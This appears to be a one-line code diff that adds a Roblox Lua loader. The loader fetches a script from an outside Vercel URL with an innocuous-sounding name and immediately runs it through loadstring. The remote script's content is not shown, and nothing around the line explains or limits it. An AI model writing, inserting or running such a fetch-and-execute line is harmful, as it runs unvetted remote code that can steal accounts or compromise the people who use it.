@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://v0-supabase-secure-storage.vercel.app/api/script/48bee2cf3bf00979b7f3efd970599e3a"))()
